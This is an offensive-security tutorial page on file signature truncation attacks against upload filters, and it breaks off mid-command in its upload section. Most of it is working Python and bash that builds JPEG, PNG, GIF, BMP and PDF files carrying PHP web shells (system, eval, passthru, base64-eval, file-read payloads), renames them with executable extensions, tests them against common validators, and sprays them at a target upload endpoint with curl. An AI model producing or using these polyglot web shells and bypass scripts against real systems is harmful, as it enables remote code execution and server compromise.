---
title: File Signature Truncation Attack
description: File Signature Truncation Attack — Exploit Partial Header Validation to Bypass Upload Filters
navigation:
  icon: i-lucide-scissors
  title: File Signature Truncation
---

## File Signature Truncation Attack


File signature truncation attacks exploit a specific weakness in how applications validate uploaded file content. Instead of parsing the **complete file structure**, many validators only check the **first N bytes** (the "magic bytes" or file signature) and assume the rest of the file matches. An attacker crafts a file that starts with valid image/document header bytes but **truncates the legitimate content early**, replacing everything after the header with executable code. The validator sees a valid JPEG header → passes. The web server sees PHP code after the header → executes it.

::tip
This technique is distinct from simple "magic byte prepending" in an important way. Truncation attacks carefully **terminate the valid file structure** at a precise boundary, ensuring that validators which attempt partial parsing (not just first-byte checks) still see enough valid structure to pass. The executable payload occupies the space where legitimate file data would normally exist.
::

The power of this approach lies in its subtlety. The file isn't just "a PHP script with JPEG bytes slapped on the front." It's a **carefully constructed partial JPEG** that satisfies multiple levels of validation — magic bytes, JFIF marker parsing, segment structure validation — before transitioning into executable code at a point where most validators stop checking.

---

## Understanding Truncation Points

Different image formats have different structures, and each format has specific points where the validator stops reading and the attacker can start injecting code. Understanding these truncation points is the difference between a payload that gets caught and one that sails through validation.

### Format-Specific Truncation Boundaries

::accordion
  :::accordion-item{icon="i-lucide-image" label="JPEG Truncation Points"}
  JPEG files consist of **segments**, each starting with a marker (two bytes: `FF` + marker ID). The validator typically reads:

  1. **SOI marker** (`FF D8`) — Start of Image (always first 2 bytes)
  2. **APP0/JFIF marker** (`FF E0`) — JFIF header with version info
  3. **APP1/EXIF marker** (`FF E1`) — EXIF metadata (optional)
  4. **DQT markers** (`FF DB`) — Quantization tables
  5. **SOF marker** (`FF C0`) — Start of Frame (contains dimensions)
  6. **DHT markers** (`FF C4`) — Huffman tables
  7. **SOS marker** (`FF DA`) — Start of Scan (actual image data begins)

  **Best truncation points:**
  - After SOI + APP0 (bytes 0-20): Satisfies "valid JPEG header" checks
  - After a COM segment (`FF FE`): Payload hidden in "comment"
  - Before SOS: Valid header structure, no scan data needed
  - After EOI (`FF D9`): File appears complete, payload is "after" the image

  Most validators stop after verifying SOI + APP0. Sophisticated validators check through SOF. Almost none parse actual scan data.
  :::

  :::accordion-item{icon="i-lucide-image" label="PNG Truncation Points"}
  PNG files have a signature followed by **chunks**. Each chunk has: length (4 bytes) + type (4 bytes) + data + CRC (4 bytes).

  Required chunks: `IHDR` (header), `IDAT` (pixel data), `IEND` (end marker).

  **Best truncation points:**
  - After signature + IHDR: Satisfies "valid PNG" checks (13 bytes of IHDR data)
  - After a tEXt chunk: Payload disguised as text metadata
  - Before IEND: Missing end marker, but validators often don't require it
  - After IEND: Payload is "post-image" data

  Many validators check only: signature (8 bytes) + IHDR chunk validity.
  :::

  :::accordion-item{icon="i-lucide-image" label="GIF Truncation Points"}
  GIF is the simplest format to truncate:

  1. **Header**: `GIF89a` or `GIF87a` (6 bytes)
  2. **Logical Screen Descriptor**: 7 bytes (dimensions, color table info)
  3. **Global Color Table**: Variable (if present)
  4. **Image Descriptor / Extensions**: Variable
  5. **Trailer**: `3B` (single byte)

  **Best truncation point:** Immediately after the 6-byte header. `GIF89a` followed by PHP code satisfies virtually every "is this a GIF?" check.
  :::

  :::accordion-item{icon="i-lucide-image" label="BMP Truncation Points"}
  BMP has a simple header:

  1. **File Header**: 14 bytes (starts with `BM`)
  2. **DIB Header**: 40 bytes (contains dimensions, bit depth)
  3. **Pixel Data**: Uncompressed pixel data

  **Best truncation point:** After the 54-byte combined header. Since BMP pixel data is raw, there's no checksum or structure validation on the pixel data portion — it can be replaced entirely with code.
  :::

  :::accordion-item{icon="i-lucide-image" label="PDF Truncation Points"}
  PDF structure:
  1. **Header**: `%PDF-1.x` (8 bytes)
  2. **Body**: Objects, streams, dictionaries
  3. **Cross-reference table**
  4. **Trailer**

  **Best truncation point:** After the header line. Many validators only check that the file starts with `%PDF-`. The rest can be PHP/ASPX/JSP code.
  :::
::

### Validator Behavior Analysis

Before crafting truncated payloads, understand how different validation functions handle truncated files.

::collapsible

| Validator Function | What It Checks | Truncation Resilience |
| ------------------ | -------------- | --------------------- |
| **PHP `getimagesize()`** | Reads JPEG headers through SOF to extract dimensions | Fails if SOF missing — need SOF in truncated header |
| **PHP `finfo_file()`** | Reads first ~1KB, matches against magic database | Easy to fool — only needs valid first bytes |
| **PHP `exif_imagetype()`** | Reads first few bytes for magic number | Trivially fooled — only checks 2-4 bytes |
| **PHP `imagecreatefromjpeg()`** | Attempts full JPEG decompression | Fails on truncated files — but error may be ignored |
| **Python `imghdr.what()`** | Reads first bytes | Trivially fooled — simple magic check |
| **Python `Pillow Image.verify()`** | Reads header structure | Fails on severely truncated files |
| **Python `magic.from_buffer()`** | Reads first bytes from libmagic | Easy to fool — short buffer |
| **Node.js `file-type`** | Reads first ~300 bytes | Need valid header within first 300 bytes |
| **Java `ImageIO.read()`** | Full decode attempt | Fails on truncation — but exception may be caught |
| **Linux `file` command** | Reads first bytes + key offsets | Easy to fool — buffer-based |
| **`Content-Type` header** | Trusts client declaration | Zero validation — always bypassable |

::

---

## Payload Crafting

### Precise JPEG Truncation Payloads

::tabs
  :::tabs-item{icon="i-lucide-scissors" label="Minimal JPEG Header + PHP"}
  ```bash
  # ═══════════════════════════════════════════════
  # Level 1: Minimal SOI + APP0 (passes magic byte checks)
  # Only 20 bytes of valid JPEG before PHP begins
  # ═══════════════════════════════════════════════

  SHELL='<?php system($_GET["cmd"]); ?>'

  # SOI (2 bytes) + APP0 JFIF marker (18 bytes) = 20 bytes of valid JPEG
  printf '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00' > trunc_l1.php.jpg
  echo "$SHELL" >> trunc_l1.php.jpg

  # Verify it's detected as JPEG
  file trunc_l1.php.jpg
  # Output: JPEG image data, JFIF standard 1.01

  # Verify PHP is present
  strings trunc_l1.php.jpg | grep "php"

  echo "[+] Level 1: $(wc -c < trunc_l1.php.jpg) bytes — minimal header"
  ```
  :::

  :::tabs-item{icon="i-lucide-scissors" label="JPEG with COM Segment Truncation"}
  ```bash
  # ═══════════════════════════════════════════════
  # Level 2: SOI + APP0 + COM segment containing PHP
  # Passes validators that check segment structure
  # PHP code is "inside" a valid JPEG comment segment
  # ═══════════════════════════════════════════════

  python3 -c "
  import struct

  shell = b'<?php system(\$_GET[\"cmd\"]); ?>'

  data = b''
  # SOI marker
  data += b'\xff\xd8'
  # APP0 (JFIF) segment
  data += b'\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
  # COM (comment) segment — PHP goes here
  com_length = struct.pack('>H', len(shell) + 2)
  data += b'\xff\xfe' + com_length + shell
  # EOI marker (makes file appear 'complete')
  data += b'\xff\xd9'

  with open('trunc_l2_com.php.jpg', 'wb') as f:
      f.write(data)

  print(f'[+] Level 2 COM: {len(data)} bytes — PHP in JPEG comment segment')
  "

  file trunc_l2_com.php.jpg
  strings trunc_l2_com.php.jpg | grep "php"
  ```
  :::

  :::tabs-item{icon="i-lucide-scissors" label="JPEG with getimagesize() Bypass"}
  ```python [jpeg_getimagesize_bypass.py]
  #!/usr/bin/env python3
  """
  Level 3: Full JPEG header that passes getimagesize().
  
  getimagesize() reads through JPEG segments looking for SOF
  (Start of Frame) which contains width/height.
  We include a minimal SOF so getimagesize() returns valid
  dimensions, then truncate and inject PHP code.
  
  This bypasses:
  - exif_imagetype()
  - finfo_file()
  - getimagesize() ← the hard one
  - file command
  """
  import struct

  def create_jpeg_truncation(output_path, php_code, width=100, height=100):
      payload = php_code.encode() if isinstance(php_code, str) else php_code

      data = b''

      # SOI (Start of Image)
      data += b'\xff\xd8'

      # APP0 (JFIF header)
      app0 = b'JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
      data += b'\xff\xe0' + struct.pack('>H', len(app0) + 2) + app0

      # COM segment with PHP payload
      data += b'\xff\xfe' + struct.pack('>H', len(payload) + 2) + payload

      # DQT (Quantization Table) — minimal valid table
      qt = bytes(range(64))  # 64 bytes of quantization values
      data += b'\xff\xdb' + struct.pack('>H', len(qt) + 3) + b'\x00' + qt

      # SOF0 (Start of Frame) — THIS is what getimagesize() needs
      # Precision: 8 bits, Height, Width, Components: 1
      sof = struct.pack('>BHH', 8, height, width)
      sof += b'\x01\x11\x00'  # 1 component, sampling 1x1, quant table 0
      data += b'\xff\xc0' + struct.pack('>H', len(sof) + 2) + sof

      # DHT (Huffman Table) — minimal DC table
      dht = b'\x00' + bytes(17) + b'\x00'  # Class 0, empty counts, 1 symbol
      data += b'\xff\xc4' + struct.pack('>H', len(dht) + 2) + dht

      # SOS (Start of Scan) — minimal
      sos = b'\x01\x01\x00\x00\x3f\x00'
      data += b'\xff\xda' + struct.pack('>H', len(sos) + 2) + sos

      # "Scan data" — just a couple bytes
      data += b'\x00\x00'

      # EOI (End of Image)
      data += b'\xff\xd9'

      with open(output_path, 'wb') as f:
          f.write(data)

      print(f"[+] {output_path} — {len(data)} bytes")
      print(f"    Dimensions: {width}x{height} (getimagesize will return these)")
      print(f"    PHP payload: {len(payload)} bytes in COM segment")

  # Generate payloads
  shells = {
      'system':   '<?php system($_GET["cmd"]); ?>',
      'eval':     '<?php eval($_POST["e"]); ?>',
      'exec':     '<?php echo "<pre>".shell_exec($_REQUEST["cmd"])."</pre>"; ?>',
      'minimal':  '<?=`$_GET[c]`?>',
      'passthru': '<?php passthru($_GET["cmd"]); ?>',
      'base64':   '<?php eval(base64_decode($_POST["e"])); ?>',
      'phpinfo':  '<?php phpinfo(); ?>',
      'file_read':'<?php echo file_get_contents($_GET["f"]); ?>',
  }

  for name, code in shells.items():
      create_jpeg_truncation(f'trunc_jpeg_{name}.jpg', code)

  # Also create with executable extensions
  create_jpeg_truncation('trunc_jpeg.phtml', '<?php system($_GET["cmd"]); ?>')
  create_jpeg_truncation('trunc_jpeg.php5', '<?php system($_GET["cmd"]); ?>')
  create_jpeg_truncation('trunc_jpeg.php.jpg', '<?php system($_GET["cmd"]); ?>')
  ```
  :::

  :::tabs-item{icon="i-lucide-scissors" label="Verify Truncation Bypasses Validators"}
  ```bash
  # ═══════════════════════════════════════════════
  # Verify each truncation level against PHP validators
  # ═══════════════════════════════════════════════

  # Test against getimagesize()
  php -r '
  $files = glob("trunc_*.jpg") + glob("trunc_*.phtml") + glob("trunc_*.php5");
  foreach($files as $f) {
      $info = @getimagesize($f);
      $type = $info ? image_type_to_mime_type($info[2]) : "FAILED";
      $dims = $info ? "{$info[0]}x{$info[1]}" : "N/A";
      echo sprintf("  %-40s → %-15s %s\n", $f, $type, $dims);
  }
  ' 2>/dev/null

  # Test against exif_imagetype()
  php -r '
  foreach(glob("trunc_*.jpg") as $f) {
      $type = @exif_imagetype($f);
      echo sprintf("  %-40s → %s\n", $f, $type ? image_type_to_mime_type($type) : "FAILED");
  }
  ' 2>/dev/null

  # Test against finfo
  php -r '
  $finfo = finfo_open(FILEINFO_MIME_TYPE);
  foreach(glob("trunc_*.jpg") as $f) {
      $mime = finfo_file($finfo, $f);
      echo sprintf("  %-40s → %s\n", $f, $mime);
  }
  finfo_close($finfo);
  ' 2>/dev/null

  # Test against Linux file command
  for f in trunc_*.jpg trunc_*.phtml; do
      echo "  $(printf '%-40s' "$f") → $(file -b "$f" | head -c 60)"
  done

  # Test against Python
  python3 -c "
  import glob
  from PIL import Image

  for f in sorted(glob.glob('trunc_*.jpg') + glob.glob('trunc_*.phtml')):
      try:
          img = Image.open(f)
          print(f'  {f:40s} → Pillow OK: {img.size} {img.format}')
      except Exception as e:
          print(f'  {f:40s} → Pillow FAIL: {str(e)[:50]}')
  " 2>/dev/null
  ```
  :::
::

### PNG Truncation Payloads

::code-group
```bash [Minimal PNG Truncation]
# PNG signature (8 bytes) + minimal IHDR chunk + PHP payload

python3 -c "
import struct, zlib

shell = b'<?php system(\$_GET[\"cmd\"]); ?>'

# PNG signature
data = b'\x89PNG\r\n\x1a\n'

# IHDR chunk (required, 13 bytes of data)
ihdr_data = struct.pack('>IIBBBBB', 100, 100, 8, 2, 0, 0, 0)  # 100x100, 8-bit RGB
ihdr_crc = struct.pack('>I', zlib.crc32(b'IHDR' + ihdr_data) & 0xffffffff)
data += struct.pack('>I', 13) + b'IHDR' + ihdr_data + ihdr_crc

# tEXt chunk containing PHP payload (disguised as metadata)
text_data = b'Comment\x00' + shell
text_crc = struct.pack('>I', zlib.crc32(b'tEXt' + text_data) & 0xffffffff)
data += struct.pack('>I', len(text_data)) + b'tEXt' + text_data + text_crc

# Minimal IDAT chunk (1 pixel of data, compressed)
raw_pixel = b'\x00\xff\x00\x00'  # filter=none, 1 red pixel
compressed = zlib.compress(raw_pixel)
idat_crc = struct.pack('>I', zlib.crc32(b'IDAT' + compressed) & 0xffffffff)
data += struct.pack('>I', len(compressed)) + b'IDAT' + compressed + idat_crc

# IEND chunk
iend_crc = struct.pack('>I', zlib.crc32(b'IEND') & 0xffffffff)
data += struct.pack('>I', 0) + b'IEND' + iend_crc

open('trunc_png.png', 'wb').write(data)
open('trunc_png.phtml', 'wb').write(data)
open('trunc_png.php.png', 'wb').write(data)
print(f'[+] trunc_png: {len(data)} bytes — valid PNG with PHP in tEXt')
"

file trunc_png.png
strings trunc_png.png | grep "php"
```

```bash [PNG Without IDAT (Ultra-Minimal)]
# Some validators only check signature + IHDR
# Skip IDAT entirely — invalid PNG but passes simple checks

python3 -c "
import struct, zlib

shell = b'<?php system(\$_GET[\"cmd\"]); ?>'

data = b'\x89PNG\r\n\x1a\n'

# IHDR
ihdr = struct.pack('>IIBBBBB', 1, 1, 8, 2, 0, 0, 0)
ihdr_crc = struct.pack('>I', zlib.crc32(b'IHDR' + ihdr) & 0xffffffff)
data += struct.pack('>I', 13) + b'IHDR' + ihdr + ihdr_crc

# Directly inject PHP after IHDR (no proper chunks)
data += shell

open('trunc_png_minimal.png', 'wb').write(data)
print(f'[+] trunc_png_minimal: {len(data)} bytes — PNG header + raw PHP')
"

file trunc_png_minimal.png
```

```bash [PNG with PHP in PLTE]
# For indexed-color PNG, the PLTE chunk contains color palette
# PHP code encoded as palette bytes

python3 -c "
import struct, zlib

shell = b'<?php system(\$_GET[\"cmd\"]); ?>'

# Pad to multiple of 3 (PLTE entries are RGB = 3 bytes)
while len(shell) % 3 != 0:
    shell += b'\x00'

data = b'\x89PNG\r\n\x1a\n'

# IHDR — indexed color (type 3)
ihdr = struct.pack('>IIBBBBB', 32, 32, 8, 3, 0, 0, 0)
ihdr_crc = struct.pack('>I', zlib.crc32(b'IHDR' + ihdr) & 0xffffffff)
data += struct.pack('>I', 13) + b'IHDR' + ihdr + ihdr_crc

# PLTE — contains PHP payload as palette entries
plte_crc = struct.pack('>I', zlib.crc32(b'PLTE' + shell) & 0xffffffff)
data += struct.pack('>I', len(shell)) + b'PLTE' + shell + plte_crc

# Minimal IDAT
raw = b'\x00' + b'\x00' * 32  # 1 scanline
for _ in range(31):
    raw += b'\x00' + b'\x00' * 32
compressed = zlib.compress(raw)
idat_crc = struct.pack('>I', zlib.crc32(b'IDAT' + compressed) & 0xffffffff)
data += struct.pack('>I', len(compressed)) + b'IDAT' + compressed + idat_crc

# IEND
iend_crc = struct.pack('>I', zlib.crc32(b'IEND') & 0xffffffff)
data += struct.pack('>I', 0) + b'IEND' + iend_crc

open('trunc_png_plte.png', 'wb').write(data)
print(f'[+] trunc_png_plte: {len(data)} bytes — PHP in PLTE chunk')
"
```
::

### GIF Truncation Payloads

::code-group
```bash [GIF Truncation Variants]
# GIF is the easiest format for truncation because
# the header is plain ASCII and minimal

SHELL='<?php system($_GET["cmd"]); ?>'

# Level 1: Just the 6-byte header (simplest possible)
echo -n "GIF89a${SHELL}" > trunc_gif_l1.gif
file trunc_gif_l1.gif  # GIF image data, version 89a

# Level 2: Header + Logical Screen Descriptor (13 bytes total)
printf 'GIF89a\x01\x00\x01\x00\x80\x00\x00' > trunc_gif_l2.gif
echo -n "$SHELL" >> trunc_gif_l2.gif
file trunc_gif_l2.gif

# Level 3: Header + LSD + Color Table + Comment Extension with PHP
python3 -c "
shell = b'<?php system(\$_GET[\"cmd\"]); ?>'

gif = bytearray()
gif += b'GIF89a'                    # Header
gif += b'\x01\x00\x01\x00'          # 1x1 dimensions
gif += b'\x80\x00\x00'              # GCT flag
gif += b'\xff\xff\xff\x00\x00\x00'  # 2-color palette
# Comment extension with PHP
gif += b'\x21\xfe'                  # Comment marker
gif += bytes([len(shell)]) + shell  # Sub-block
gif += b'\x00'                      # Block terminator
# Image data
gif += b'\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00'
gif += b'\x02\x02\x44\x01\x00'
gif += b'\x3b'                      # Trailer

open('trunc_gif_l3.gif', 'wb').write(bytes(gif))
print(f'[+] trunc_gif_l3: {len(gif)} bytes — full valid GIF with PHP')
"

# Level 4: GIF87a variant (older, sometimes bypasses GIF89a-specific checks)
echo -n "GIF87a${SHELL}" > trunc_gif87a.gif

# Create copies with different extensions
for f in trunc_gif_l1.gif trunc_gif_l3.gif; do
    base="${f%.gif}"
    cp "$f" "${base}.phtml"
    cp "$f" "${base}.php.gif"
    cp "$f" "${base}.php5"
done

echo "[+] GIF truncation payloads:"
ls -la trunc_gif_*
```

```bash [Multi-Shell GIF]
# Multiple PHP shells in different GIF structures
# If one is stripped, others may survive

python3 -c "
shells = [
    b'<?php system(\$_GET[\"cmd\"]); ?>',
    b'<?php eval(\$_POST[\"e\"]); ?>',
    b'<?=\`\$_GET[c]\`?>',
    b'<?php passthru(\$_GET[\"cmd\"]); ?>',
]

gif = bytearray()
gif += b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00'

# Each shell in a separate comment extension
for shell in shells:
    gif += b'\x21\xfe'
    for i in range(0, len(shell), 255):
        block = shell[i:i+255]
        gif += bytes([len(block)]) + block
    gif += b'\x00'

# Image data
gif += b'\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b'

# Also append PHP AFTER the GIF trailer
gif += b'\n' + shells[0]

open('trunc_gif_multi.gif', 'wb').write(bytes(gif))
print(f'[+] trunc_gif_multi.gif: {len(gif)} bytes — {len(shells)} shells embedded')
"
```
::

### BMP & PDF Truncation

::code-group
```bash [BMP Truncation]
# BMP has the simplest binary structure — 54-byte header then raw pixels
# Replace "pixel data" with PHP code

python3 -c "
import struct

shell = b'<?php system(\$_GET[\"cmd\"]); ?>'

# BMP File Header (14 bytes)
header = b'BM'
header += struct.pack('<I', 54 + len(shell))  # File size
header += b'\x00\x00\x00\x00'                # Reserved
header += struct.pack('<I', 54)               # Offset to pixel data

# DIB Header (40 bytes)
dib = struct.pack('<I', 40)                   # DIB header size
dib += struct.pack('<ii', 1, 1)               # Width, Height
dib += struct.pack('<HH', 1, 24)              # Planes, Bits per pixel
dib += b'\x00' * 24                           # Compression, sizes, etc.

# 'Pixel data' is actually PHP code
bmp = header + dib + shell

open('trunc_bmp.bmp', 'wb').write(bmp)
open('trunc_bmp.phtml', 'wb').write(bmp)
print(f'[+] trunc_bmp: {len(bmp)} bytes — PHP in pixel data area')
"

file trunc_bmp.bmp  # PC bitmap, Windows 3.x format
strings trunc_bmp.bmp | grep "php"
```

```bash [PDF Truncation]
# PDF validators often only check the %PDF- header
# Everything after can be PHP code

SHELL='<?php system($_GET["cmd"]); ?>'

# Level 1: Minimal
echo "%PDF-1.4${SHELL}" > trunc_pdf.pdf.php

# Level 2: With basic PDF structure (passes stricter checks)
cat > trunc_pdf_structured.pdf.php << PDFEOF
%PDF-1.4
1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj
2 0 obj<</Type/Pages/Kids[]/Count 0>>endobj
${SHELL}
%%EOF
PDFEOF

file trunc_pdf.pdf.php  # PDF document, version 1.4
```

```bash [Multi-Format Truncation Generator]
# Generate truncated payloads for ALL image formats simultaneously

SHELL='<?php system($_GET["cmd"]); ?>'

# JPEG
printf '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'"${SHELL}" > trunc_all.jpg

# PNG
printf '\x89PNG\r\n\x1a\n'"${SHELL}" > trunc_all.png

# GIF
echo -n "GIF89a${SHELL}" > trunc_all.gif

# BMP
printf 'BM\x00\x00\x00\x00\x00\x00\x00\x00\x36\x00\x00\x00\x28\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x18\x00'"${SHELL}" > trunc_all.bmp

# PDF
echo "%PDF-1.4 ${SHELL}" > trunc_all.pdf

# Create executable-extension copies of each
for f in trunc_all.*; do
    base="${f%.???}"
    orig_ext="${f##*.}"
    cp "$f" "${f}.php"        # double extension
    cp "$f" "${base}.phtml"   # alt extension
    cp "$f" "${base}.php5"    # alt extension
    cp "$f" "${base}.php.${orig_ext}"  # double reversed
done

echo "[+] All truncation payloads generated:"
ls -la trunc_all*
```
::

---

## Advanced Truncation Techniques

### Precise Boundary Manipulation

::accordion
  :::accordion-item{icon="i-lucide-wrench" label="JPEG Segment Length Manipulation"}
  ```python [segment_length_manipulation.py]
  #!/usr/bin/env python3
  """
  Manipulate JPEG segment lengths to hide PHP code.
  
  Each JPEG segment has a length field. By declaring a larger
  segment length than the actual valid data, we can include
  PHP code within what the parser thinks is segment data.
  
  Validator reads: "This APP0 segment is 500 bytes long"
  Validator skips 500 bytes to the next marker
  The PHP code is hidden WITHIN those 500 bytes
  """
  import struct

  def create_oversized_segment(output, php_code):
      payload = php_code.encode()

      data = b'\xff\xd8'  # SOI

      # APP0 with oversized length — contains valid JFIF header + PHP payload
      jfif_header = b'JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
      # padding between JFIF data and PHP code
      padding = b'\x00' * 50
      app0_content = jfif_header + padding + payload

      # Length field includes itself (2 bytes) + content
      app0_length = struct.pack('>H', len(app0_content) + 2)
      data += b'\xff\xe0' + app0_length + app0_content

      # End of image
      data += b'\xff\xd9'

      with open(output, 'wb') as f:
          f.write(data)

      print(f"[+] {output} — PHP hidden in oversized APP0 segment")
      print(f"    APP0 declared length: {len(app0_content)+2} bytes")
      print(f"    Payload at offset: {2 + 2 + 2 + len(jfif_header) + len(padding)}")

  def create_fake_segment(output, php_code):
      """Use APP12 or other unused APP segments to hide code"""
      payload = php_code.encode()

      data = b'\xff\xd8'  # SOI

      # Normal APP0
      data += b'\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'

      # APP12 (rarely used — validators skip it)
      # Contains PHP payload
      app12_length = struct.pack('>H', len(payload) + 2)
      data += b'\xff\xec' + app12_length + payload

      # APP13 — another unused slot
      data += b'\xff\xed' + app12_length + payload

      # APP14 — another slot
      data += b'\xff\xee' + app12_length + payload

      data += b'\xff\xd9'

      with open(output, 'wb') as f:
          f.write(data)

      print(f"[+] {output} — PHP in APP12/13/14 segments ({len(data)} bytes)")

  shells = {
      'system':  '<?php system($_GET["cmd"]); ?>',
      'eval':    '<?php eval($_POST["e"]); ?>',
      'minimal': '<?=`$_GET[c]`?>',
  }

  for name, code in shells.items():
      create_oversized_segment(f'seg_oversized_{name}.jpg', code)
      create_fake_segment(f'seg_fake_{name}.jpg', code)
  ```
  :::

  :::accordion-item{icon="i-lucide-wrench" label="Post-EOF Injection"}
  ```bash
  # ═══════════════════════════════════════════════
  # Inject PHP code AFTER the End-of-Image / End-of-File marker
  # 
  # The image is 100% valid and complete.
  # PHP code exists after the image ends.
  # Image viewers stop at EOF marker.
  # PHP interpreter scans the ENTIRE file for <?php tags.
  # ═══════════════════════════════════════════════

  SHELL='<?php system($_GET["cmd"]); ?>'

  # ── JPEG: Inject after EOI (FF D9) ──
  # Start with a valid, complete image
  python3 -c "
  from PIL import Image
  img = Image.new('RGB', (100, 100), (255, 0, 0))
  img.save('/tmp/valid_complete.jpg', 'JPEG', quality=95)
  " 2>/dev/null || printf '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xFF\xD9' > /tmp/valid_complete.jpg

  # Append PHP after EOI
  cat /tmp/valid_complete.jpg > posteof_jpeg.jpg
  echo "$SHELL" >> posteof_jpeg.jpg

  # Verify: file command sees valid JPEG
  file posteof_jpeg.jpg
  # Image viewers display the image normally
  # But the file ALSO contains PHP code after the image data

  # ── PNG: Inject after IEND ──
  python3 -c "
  from PIL import Image
  img = Image.new('RGB', (100, 100), (0, 0, 255))
  img.save('/tmp/valid_complete.png', 'PNG')
  " 2>/dev/null

  cat /tmp/valid_complete.png > posteof_png.png
  echo '<?php system($_GET["cmd"]); ?>' >> posteof_png.png

  # ── GIF: Inject after trailer (3B) ──
  python3 -c "
  from PIL import Image
  img = Image.new('RGB', (100, 100), (0, 255, 0))
  img.save('/tmp/valid_complete.gif', 'GIF')
  " 2>/dev/null

  cat /tmp/valid_complete.gif > posteof_gif.gif
  echo '<?php system($_GET["cmd"]); ?>' >> posteof_gif.gif

  echo "[+] Post-EOF injection files:"
  for f in posteof_*; do
      echo "  $(printf '%-30s' "$f") → $(file -b "$f" | head -c 50)"
      echo "    PHP: $(strings "$f" | grep -c 'php') payload(s)"
  done

  rm -f /tmp/valid_complete.*
  ```
  :::

  :::accordion-item{icon="i-lucide-wrench" label="Double-Structure Truncation (Image + Code)"}
  ```python [double_structure.py]
  #!/usr/bin/env python3
  """
  Create a file that is simultaneously:
  1. A valid, displayable image (passes ALL image validation)
  2. A valid PHP/ASPX/JSP script (PHP interpreter finds code)
  
  The image portion is REAL — not just headers.
  The code portion is hidden in metadata or post-EOF.
  
  This is the most reliable truncation technique because
  even sophisticated validators that fully parse the image
  structure will see a valid, complete image.
  """
  from PIL import Image
  import struct
  import io

  def create_genuine_jpeg_with_code(output, php_code, width=200, height=200):
      """Create a REAL JPEG image with PHP in COM segment"""
      payload = php_code.encode()

      # Create a genuine, complex image (not just solid color)
      img = Image.new('RGB', (width, height))
      pixels = img.load()
      for x in range(width):
          for y in range(height):
              pixels[x, y] = (
                  (x * 7 + 50) % 256,
                  (y * 13 + 100) % 256,
                  ((x + y) * 3 + 75) % 256
              )

      # Save to buffer
      buf = io.BytesIO()
      img.save(buf, 'JPEG', quality=85, subsampling=0)
      jpeg_data = buf.getvalue()

      # Insert COM segment containing PHP after SOI+APP0
      soi = jpeg_data[:2]
      rest = jpeg_data[2:]

      # Find end of APP0 segment
      pos = 0
      if rest[0:2] == b'\xff\xe0':
          app0_len = struct.unpack('>H', rest[2:4])[0]
          pos = 2 + app0_len

      com = b'\xff\xfe' + struct.pack('>H', len(payload) + 2) + payload
      result = soi + rest[:pos] + com + rest[pos:]

      # Also append PHP after EOI for redundancy
      result += b'\n' + payload

      with open(output, 'wb') as f:
          f.write(result)

      # Verify
      try:
          verify_img = Image.open(output)
          verify_img.verify()
          size = verify_img.size
          print(f"[+] {output:40s} — Valid JPEG ✓ ({size[0]}x{size[1]}, {len(result):,} bytes)")
      except Exception as e:
          print(f"[!] {output:40s} — Verify warning: {e}")

  # Generate with multiple shell types
  shells = {
      'system':   '<?php system($_GET["cmd"]); ?>',
      'eval':     '<?php eval($_POST["e"]); ?>',
      'exec':     '<?php echo "<pre>".shell_exec($_REQUEST["cmd"])."</pre>"; ?>',
      'minimal':  '<?=`$_GET[c]`?>',
      'passthru': '<?php passthru($_GET["cmd"]); ?>',
      'phpinfo':  '<?php phpinfo(); ?>',
  }

  for name, code in shells.items():
      create_genuine_jpeg_with_code(f'genuine_trunc_{name}.jpg', code)
      create_genuine_jpeg_with_code(f'genuine_trunc_{name}.phtml', code)
      create_genuine_jpeg_with_code(f'genuine_trunc_{name}.php.jpg', code)

  print(f"\n[+] Generated {len(shells) * 3} genuine truncation payloads")
  ```
  :::
::

---

## Upload Delivery & Exploitation

### Systematic Upload Testing

::tabs
  :::tabs-item{icon="i-lucide-upload" label="Upload All Truncation Variants"}
  ```bash
  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  FIELD="file"

  echo "═══ Truncation Payload Upload Spray ═══"

  # Upload each truncation payload with different extension strategies
  for payload_file in trunc_*.jpg trunc_*.gif trunc_*.png trunc_*.bmp \
                      genuine_trunc_*.jpg genuine_trunc_*.phtml \
                      seg_*.jpg posteof_*.jpg posteof_*.gif posteof_*.png; do
      [ -f "$payload_file" ] || continue

      BASENAME=$(basename "$payload_file")
      ORIG_EXT="${BASENAME##*.}"

      # Strategy 1: Original extension (needs handler override chain)
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@${payload_file};filename=${BASENAME};type=image/jpeg" \
        -H "Cookie: $COOKIE" 2>/dev/null)
      [ "$STATUS" = "200" ] && echo "[+] ${BASENAME} → ACCEPTED (original ext)"

      # Strategy 2: PHP extension (direct execution)
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@${payload_file};filename=${BASENAME%.${ORIG_EXT}}.php;type=image/jpeg" \
        -H "Cookie: $COOKIE" 2>/dev/null)
      [ "$STATUS" = "200" ] && echo "[+] ${BASENAME%.${ORIG_EXT}}.php → ACCEPTED (php ext)"

      # Strategy 3: Alternative PHP extension
      for ext in phtml php5 pht phar; do
          STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
            -F "${FIELD}=@${payload_file};filename=${BASENAME%.${ORIG_EXT}}.${ext};type=image/jpeg" \
            -H "Cookie: $COOKIE" 2>/dev/null)
          [ "$STATUS" = "200" ] && echo "[+] .${ext} → ACCEPTED (alt ext)"
      done

      # Strategy 4: Double extension
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
